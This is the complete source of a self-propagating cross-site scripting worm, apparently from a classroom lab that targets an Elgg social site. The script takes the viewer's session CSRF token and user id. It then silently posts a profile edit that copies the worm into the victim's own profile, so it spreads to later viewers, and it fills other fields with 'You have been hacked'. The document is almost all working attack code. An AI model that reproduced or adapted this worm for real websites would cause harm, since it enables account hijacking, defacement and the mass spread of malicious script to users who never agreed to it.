<script id=worm> 
window.onload = function () {
var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	console.log('hello')


    //Construct the content of your url
    var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
    console.log('hemlo1');
    var namee = elgg.session.user.name;

    var userid = elgg.page_owner.guid;

    var data = new FormData();
    console.log('hemlo2');
    data.append('__elgg_token', elgg.security.token.__elgg_token );
    data.append('__elgg_ts', elgg.security.token.__elgg_ts);

    data.append('name', namee);
    console.log('hemlo3');
    //alert(jsCode);
    data.append('description', wormCode);
    data.append('accesslevel[description]', 1);

    

    data.append('briefdescription', '121212');
    data.append('accesslevel[briefdescription]', 1);

    data.append('location', 'You have been hacked');
    data.append('accesslevel[location]', 1);

    data.append('interests', 'You have been hacked');
    data.append('accesslevel[interests]', 1);

    data.append('skills', 'You have been hacked');
    data.append('accesslevel[skills]', 1);

    data.append('contactemail', 'hacked@gmail.com');
    data.append('accesslevel[contactemail]', 1);

    data.append('phone', 'You have been hacked');
    data.append('accesslevel[phone]', 1);

    data.append('mobile', 'You have been hacked');
    data.append('accesslevel[mobile]', 1);

    data.append('website', 'www.hacked.com');
    data.append('accesslevel[website]', 1);

    data.append('twitter', 'You have been hacked');
    data.append('accesslevel[twitter]', 1);

    data.append('guid', elgg.session.user.guid);

    if(elgg.session.user.guid != elgg.page_owner.guid)
    {
		//Create and send Ajax request to modify profile
		var Ajax=null;
    Ajax=new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    Ajax.setRequestHeader("Cookie",document.cookie);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    Ajax.send(data);
    console.log('success');
	}


	//alert(jsCode);
}
</script>



			